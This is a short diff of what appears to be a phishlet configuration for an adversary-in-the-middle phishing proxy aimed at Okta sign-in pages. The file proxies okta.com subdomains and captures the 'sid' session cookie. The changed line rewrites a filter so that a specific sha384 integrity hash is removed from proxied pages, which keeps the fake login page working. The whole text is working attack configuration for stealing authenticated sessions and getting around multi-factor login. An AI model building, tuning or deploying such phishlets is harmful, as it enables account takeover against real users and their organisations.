@@ -5,7 +5,7 @@ proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false }
   - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: '', domain: 'EXAMPLE.okta.com', search: 'sha384', replace: 'sha123', mimes: ['text/html']}
+  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: '', domain: 'EXAMPLE.okta.com', search: 'sha384-kPXcto1qCzOfdWQH/GuCTAx104vf036zjQGmDflpIypbdkTbv9EA/d9VNWXoZLPY', replace: '', mimes: ['text/html']}
 auth_tokens:
   - domain: 'EXAMPLE.okta.com'
     keys: ['sid']
